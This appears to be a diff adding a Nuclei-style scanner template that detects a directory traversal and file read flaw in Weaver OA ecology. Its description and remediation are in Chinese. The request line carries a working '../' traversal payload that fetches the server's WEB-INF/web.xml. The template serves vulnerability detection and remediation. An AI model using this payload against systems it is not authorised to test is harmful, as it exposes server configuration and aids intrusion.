@@ -1,0 +1,25 @@
+id: ecology-fileDownload-directoryTraversal
+info:
+  name: 泛微文件下载目录遍历
+  author:
+  - l0ne1y
+  description: |-
+    泛微OA云桥任意文件读取和目录遍历漏洞
+    任意文件读取/下载漏洞不同于网站目录浏览，此漏洞不仅仅可遍历系统下web中的文件，而且可以浏览或者下载到系统中的文件，攻击人员通过目录遍历攻击可以获取系统文件及服务器的配置文件等等。一般来说，攻击者利用服务器API、文件标准权限进行攻击。任意文件读取/下载漏洞可能存在于Web服务器软件本身，也可能存在于Web应用程序之中，在该漏洞中攻击者可以通过返回内容识别程序运行路径从而下载数据库配置文件危害可见。
+  severity: medium
+  remediation: |-
+    #### 官方修复方案：
+    升级系统至无漏洞版本，或于官网下载安全补丁。
+requests:
+- matchers:
+  - type: word
+    part: body
+    words:
+    - <url-pattern>/weaver/
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml'
+  method: GET
